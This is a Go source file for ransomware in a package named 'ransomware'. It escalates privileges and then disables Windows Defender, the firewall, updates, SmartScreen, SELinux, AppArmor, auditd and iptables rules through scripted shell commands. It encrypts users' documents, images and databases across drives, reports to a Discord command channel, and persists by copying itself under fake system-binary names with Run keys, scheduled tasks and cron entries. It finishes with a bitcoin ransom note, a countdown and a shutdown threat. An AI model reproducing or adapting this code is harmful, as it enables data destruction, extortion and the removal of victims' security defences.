package ransomware

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"programa/utils"
	"runtime"
	"strings"
	"time"
)

var excludeDirs = []string{
	"Windows", "System32", "Program Files", "Program Files (x86)",
	"ProgramData", "AppData", "boot", "bin", "sbin", "lib", "lib64",
	"usr", "etc", "dev", "proc", "sys", "run", "tmp", "var/log",
}

var excludeExtensions = []string{
	".exe", ".dll", ".sys", ".drv", ".encrypted",
}

var targetExtensions = []string{
	".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
	".pdf", ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mp3",
	".zip", ".rar", ".7z", ".sql", ".db", ".mdb", ".accdb",
	".pst", ".ost", ".csv", ".json", ".xml", ".html", ".css", ".js",
}

func initializeEncryption() {
	fmt.Println("[*] Initializing ransomware...")

	escalatePrivileges()
	DisableAllProtections()

	encryptionKey = generateKey()
	encryptionKeyHex = hex.EncodeToString(encryptionKey)
	decryptionKeyHex = encryptionKeyHex

	fmt.Printf("[+] Encryption key generated: %s\n", encryptionKeyHex)

	if err := saveVictimDecryptionKeyFile(); err != nil {
		fmt.Printf("[!] Could not write local key file: %v\n", err)
	}

	channelID, err := GenDC(encryptionKeyHex, decryptionKeyHex)
	if err != nil {
		fmt.Printf("[!] Failed to connect to C2: %v\n", err)
		fmt.Println("[*] Continuing without C2...")
	} else {
		discordChannelID = channelID
		fmt.Printf("[+] C2 connected - Channel: %s\n", channelID)

		go StartDiscordC2(channelID, decryptionKeyHex)
	}

	establishPersistence()

	resetEncryptionStats()
	fmt.Println("[*] Starting file encryption...")
	encryptSystem()

	if discordChannelID != "" {
		if err := SendEncryptionStatsEmbed(discordChannelID); err != nil {
			fmt.Printf("[!] Could not post encryption report to Discord: %v\n", err)
		}
	}

	deadlineTime = time.Now().Add(RANSOM_HOURS * time.Hour)
	saveDeadline()

	fmt.Println("[*] Encryption complete. Locking screen...")
	lockScreen()
}

func resetEncryptionStats() {
	EncryptStatsFiles = 0
	EncryptStatsBytes = 0
	EncryptStatsFailed = 0
	EncryptStatsStarted = time.Now()
	encryptStatsByExt = make(map[string]int)
}

func saveVictimDecryptionKeyFile() error {
	return os.WriteFile(victimDecryptionKeyPath(), []byte(encryptionKeyHex), 0600)
}


func DisableWindowsDefender() {
	if runtime.GOOS != "windows" {
		return
	}

	fmt.Printf("%s[*] Disabling Windows Defender...%s\n", utils.Yellow, utils.Reset)

	commands := [][]string{
		{"powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"},
		{"powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true"},
		{"powershell", "-Command", "Set-MpPreference -DisableBlockAtFirstSeen $true"},
		{"powershell", "-Command", "Set-MpPreference -DisableIOAVProtection $true"},
		{"powershell", "-Command", "Set-MpPreference -DisableScriptScanning $true"},
		{"powershell", "-Command", "Set-MpPreference -SubmitSamplesConsent 2"},
		{"powershell", "-Command", "Set-MpPreference -MAPSReporting 0"},
		{"powershell", "-Command", "Add-MpPreference -ExclusionPath 'C:\\'"},
		{"reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"},
		{"reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "/v", "DisableBehaviorMonitoring", "/t", "REG_DWORD", "/d", "1", "/f"},
		{"reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "/v", "DisableOnAccessProtection", "/t", "REG_DWORD", "/d", "1", "/f"},
		{"reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "/v", "DisableScanOnRealtimeEnable", "/t", "REG_DWORD", "/d", "1", "/f"},
		{"sc", "config", "WinDefend", "start=disabled"},
		{"sc", "stop", "WinDefend"},
		{"sc", "config", "WdNisSvc", "start=disabled"},
		{"sc", "stop", "WdNisSvc"},
		{"sc", "config", "Sense", "start=disabled"},
		{"sc", "stop", "Sense"},
		{"powershell", "-Command", "Uninstall-WindowsFeature -Name Windows-Defender"},
	}

	successCount := 0
	for _, cmd := range commands {
		err := exec.Command(cmd[0], cmd[1:]...).Run()
		if err == nil {
			successCount++
		}
	}

	if successCount > 0 {
		fmt.Printf("%s[✓] Windows Defender disabled (%d/%d commands succeeded)%s\n", utils.Green, successCount, len(commands), utils.Reset)
	} else {
		fmt.Printf("%s[!] Failed to disable Windows Defender (requires admin)%s\n", utils.Red, utils.Reset)
	}
}

func DisableLinuxAntivirus() {
	if runtime.GOOS != "linux" {
		return
	}

	fmt.Printf("%s[*] Disabling Linux security...%s\n", utils.Yellow, utils.Reset)

	commands := [][]string{
		{"systemctl", "stop", "clamav-daemon"},
		{"systemctl", "disable", "clamav-daemon"},
		{"systemctl", "stop", "clamav-freshclam"},
		{"systemctl", "disable", "clamav-freshclam"},
		{"systemctl", "stop", "apparmor"},
		{"systemctl", "disable", "apparmor"},
		{"aa-teardown"},
		{"setenforce", "0"},
		{"systemctl", "stop", "firewalld"},
		{"systemctl", "disable", "firewalld"},
		{"ufw", "disable"},
		{"systemctl", "stop", "ufw"},
		{"systemctl", "disable", "ufw"},
		{"systemctl", "stop", "fail2ban"},
		{"systemctl", "disable", "fail2ban"},
		{"iptables", "-F"},
		{"iptables", "-X"},
		{"iptables", "-P", "INPUT", "ACCEPT"},
		{"iptables", "-P", "FORWARD", "ACCEPT"},
		{"iptables", "-P", "OUTPUT", "ACCEPT"},
	}

	successCount := 0
	for _, cmd := range commands {
		err := exec.Command(cmd[0], cmd[1:]...).Run()
		if err == nil {
			successCount++
		}
	}

	sedCommands := []string{
		"sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config",
		"sed -i 's/SELINUX=permissive/SELINUX=disabled/' /etc/selinux/config",
	}

	for _, cmd := range sedCommands {
		exec.Command("sh", "-c", cmd).Run()
	}

	if successCount > 0 {
		fmt.Printf("%s[✓] Linux security disabled (%d/%d commands succeeded)%s\n", utils.Green, successCount, len(commands), utils.Reset)
	} else {
		fmt.Printf("%s[!] Failed to disable security (requires root)%s\n", utils.Red, utils.Reset)
	}
}

func DisableAllProtections() {
	fmt.Printf("\n%s═══ DISABLING SECURITY PROTECTIONS ═══%s\n\n", utils.Red, utils.Reset)

	switch runtime.GOOS {
	case "windows":
		DisableWindowsDefender()
		DisableWindowsFirewall()
		DisableWindowsUpdates()
		DisableTamperProtection()
		DisableSmartScreen()
	case "linux":
		DisableLinuxAntivirus()
		DisableSELinux()
		DisableAuditd()
	}

	fmt.Printf("\n%s[✓] All protections disabled%s\n", utils.Green, utils.Reset)
}

func DisableWindowsFirewall() {
	exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", "off").Run()
	exec.Command("netsh", "firewall", "set", "opmode", "disable").Run()
	fmt.Printf("%s[✓] Windows Firewall disabled%s\n", utils.Green, utils.Reset)
}

func DisableWindowsUpdates() {
	commands := [][]string{
		{"sc", "config", "wuauserv", "start=disabled"},
		{"sc", "stop", "wuauserv"},
		{"reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "/v", "NoAutoUpdate", "/t", "REG_DWORD", "/d", "1", "/f"},
	}

	for _, cmd := range commands {
		exec.Command(cmd[0], cmd[1:]...).Run()
	}

	fmt.Printf("%s[✓] Windows Updates disabled%s\n", utils.Green, utils.Reset)
}

func DisableTamperProtection() {
	commands := [][]string{
		{"reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features", "/v", "TamperProtection", "/t", "REG_DWORD", "/d", "0", "/f"},
		{"powershell", "-Command", "Set-MpPreference -DisableIntrusionPreventionSystem $true"},
	}

	for _, cmd := range commands {
		exec.Command(cmd[0], cmd[1:]...).Run()
	}

	fmt.Printf("%s[✓] Tamper Protection disabled%s\n", utils.Green, utils.Reset)
}

func DisableSmartScreen() {
	commands := [][]string{
		{"reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "/v", "EnableSmartScreen", "/t", "REG_DWORD", "/d", "0", "/f"},
		{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost", "/v", "EnableWebContentEvaluation", "/t", "REG_DWORD", "/d", "0", "/f"},
	}

	for _, cmd := range commands {
		exec.Command(cmd[0], cmd[1:]...).Run()
	}

	fmt.Printf("%s[✓] SmartScreen disabled%s\n", utils.Green, utils.Reset)
}

func DisableSELinux() {
	exec.Command("setenforce", "0").Run()
	exec.Command("sh", "-c", "sed -i 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config").Run()
	fmt.Printf("%s[✓] SELinux disabled%s\n", utils.Green, utils.Reset)
}

func DisableAuditd() {
	exec.Command("systemctl", "stop", "auditd").Run()
	exec.Command("systemctl", "disable", "auditd").Run()
	exec.Command("service", "auditd", "stop").Run()
	fmt.Printf("%s[✓] Auditd disabled%s\n", utils.Green, utils.Reset)
}

func escalatePrivileges() {
	if isWindows {
		cmd := exec.Command("powershell", "-Command", "Start-Process", os.Args[0], "-Verb", "RunAs")
		err := cmd.Run()
		if err == nil {
			os.Exit(0)
		}
	} else {
		if os.Geteuid() != 0 {
			cmd := exec.Command("sudo", os.Args[0])
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			cmd.Stdin = os.Stdin
			err := cmd.Run()
			if err == nil {
				os.Exit(0)
			}
		}
	}
}

func generateKey() []byte {
	key := make([]byte, 32)
	rand.Read(key)
	return key
}

func encryptSystem() {
	if EncryptStatsStarted.IsZero() {
		EncryptStatsStarted = time.Now()
	}

	var rootPaths []string

	if isWindows {
		for _, drive := range []string{"C:", "D:", "E:", "F:"} {
			if _, err := os.Stat(drive + "\\"); err == nil {
				rootPaths = append(rootPaths, drive+"\\")
			}
		}
	} else {
		rootPaths = []string{"/home/", "/root/", "/opt/", "/srv/"}
	}

	for _, rootPath := range rootPaths {
		filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			if info.IsDir() {
				if shouldSkipDir(path) {
					return filepath.SkipDir
				}
				return nil
			}

			if shouldEncryptFile(path, info) {
				encryptFile(path, info.Size())
			}

			return nil
		})
	}

	fmt.Printf("[+] Encrypted %d files\n", len(encryptedFiles))
}

func shouldSkipDir(path string) bool {
	for _, exclude := range excludeDirs {
		if strings.Contains(strings.ToLower(path), strings.ToLower(exclude)) {
			return true
		}
	}
	return false
}

func shouldEncryptFile(path string, _ os.FileInfo) bool {
	ext := strings.ToLower(filepath.Ext(path))

	for _, excludeExt := range excludeExtensions {
		if ext == excludeExt {
			return false
		}
	}

	if strings.HasSuffix(path, ".encrypted") {
		return false
	}

	for _, targetExt := range targetExtensions {
		if ext == targetExt {
			return true
		}
	}

	return false
}

func encryptFile(path string, size int64) {
	file, err := os.Open(path)
	if err != nil {
		EncryptStatsFailed++
		return
	}
	defer file.Close()

	var data []byte
	if size > MAX_FILE_SIZE {
		data = make([]byte, PARTIAL_ENCRYPT_MB)
		_, err = file.Read(data)
		if err != nil {
			EncryptStatsFailed++
			return
		}
	} else {
		data, err = io.ReadAll(file)
		if err != nil {
			EncryptStatsFailed++
			return
		}
	}

	encrypted, err := encryptData(data)
	if err != nil {
		EncryptStatsFailed++
		return
	}

	file.Close()

	err = os.WriteFile(path, encrypted, 0644)
	if err != nil {
		EncryptStatsFailed++
		return
	}

	newPath := path + ".encrypted"
	if err := os.Rename(path, newPath); err != nil {
		EncryptStatsFailed++
		return
	}

	encryptedFiles = append(encryptedFiles, newPath)
	ext := strings.ToLower(filepath.Ext(path))
	if ext == "" {
		ext = "(no ext)"
	}
	encryptStatsByExt[ext]++
	EncryptStatsFiles++
	EncryptStatsBytes += int64(len(data))
}

func encryptData(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func establishPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	if isWindows {
		copyLocations := []string{
			os.Getenv("APPDATA") + "\\Microsoft\\Windows\\svchost.exe",
			os.Getenv("TEMP") + "\\winlogon.exe",
			"C:\\ProgramData\\system32.exe",
		}

		for _, dest := range copyLocations {
			utils.CopyFile(exePath, dest)
		}

		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
			"/v", "WindowsUpdate", "/t", "REG_SZ", "/d", copyLocations[0], "/f").Run()

		exec.Command("schtasks", "/create", "/tn", "SystemMaintenance", "/tr", copyLocations[0],
			"/sc", "onlogon", "/f").Run()

	} else {
		copyLocations := []string{
			"/tmp/.systemd",
			"/var/tmp/.update",
		}

		for _, dest := range copyLocations {
			utils.CopyFile(exePath, dest)
			os.Chmod(dest, 0755)
		}

		cronJob := fmt.Sprintf("@reboot %s\n", copyLocations[0])
		exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob)).Run()
	}
}

func saveDeadline() {
	deadlineFile := getDeadlineFilePath()
	os.WriteFile(deadlineFile, []byte(deadlineTime.Format(time.RFC3339)), 0644)
}

func loadDeadline() time.Time {
	deadlineFile := getDeadlineFilePath()
	data, err := os.ReadFile(deadlineFile)
	if err != nil {
		return time.Now().Add(RANSOM_HOURS * time.Hour)
	}

	t, err := time.Parse(time.RFC3339, string(data))
	if err != nil {
		return time.Now().Add(RANSOM_HOURS * time.Hour)
	}

	return t
}

func getDeadlineFilePath() string {
	if isWindows {
		return os.Getenv("APPDATA") + "\\deadline.dat"
	}
	return "/tmp/.deadline"
}

func lockScreen() {
	if isWindows {
		lockScreenWindows()
	} else {
		lockScreenLinux()
	}
}

func lockScreenWindows() {
	exec.Command("powershell", "-Command", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Application]::Run((New-Object System.Windows.Forms.Form -Property @{FormBorderStyle='None';WindowState='Maximized';TopMost=$true;BackColor='utils.Red'}))").Start()

	showRansomNoteWindows()
}

func lockScreenLinux() {
	showRansomNoteLinux()
}

func showRansomNoteWindows() {
	wallet := "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
	amount := "0.5 BTC"

	for {
		deadline := loadDeadline()
		remaining := time.Until(deadline)

		if remaining <= 0 {
			exec.Command("shutdown", "/s", "/t", "0").Run()
			break
		}

		hours := int(remaining.Hours())
		minutes := int(remaining.Minutes()) % 60
		seconds := int(remaining.Seconds()) % 60

		message := fmt.Sprintf(`
═══════════════════════════════════════════════════
     YOUR COMPUTER HAS BEEN COMPROMISED
═══════════════════════════════════════════════════

All your files have been encrypted with military-grade
encryption. You cannot access them without our help.

Send %s to the following wallet:
%s

Time remaining: %02d:%02d:%02d

If timer reaches zero, your files will be permanently
deleted and your system will be shut down.

═══════════════════════════════════════════════════
`, amount, wallet, hours, minutes, seconds)

		exec.Command("msg", "*", message).Run()
		time.Sleep(60 * time.Second)
	}
}

func showRansomNoteLinux() {
	wallet := "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
	amount := "0.5 BTC"

	for {
		deadline := loadDeadline()
		remaining := time.Until(deadline)

		if remaining <= 0 {
			exec.Command("shutdown", "-h", "now").Run()
			break
		}

		hours := int(remaining.Hours())
		minutes := int(remaining.Minutes()) % 60
		seconds := int(remaining.Seconds()) % 60

		message := fmt.Sprintf(`
YOUR COMPUTER HAS BEEN COMPROMISED

All your files have been encrypted.

Send %s to: %s

Time remaining: %02d:%02d:%02d
`, amount, wallet, hours, minutes, seconds)

		exec.Command("wall", message).Run()
		time.Sleep(60 * time.Second)
	}
}
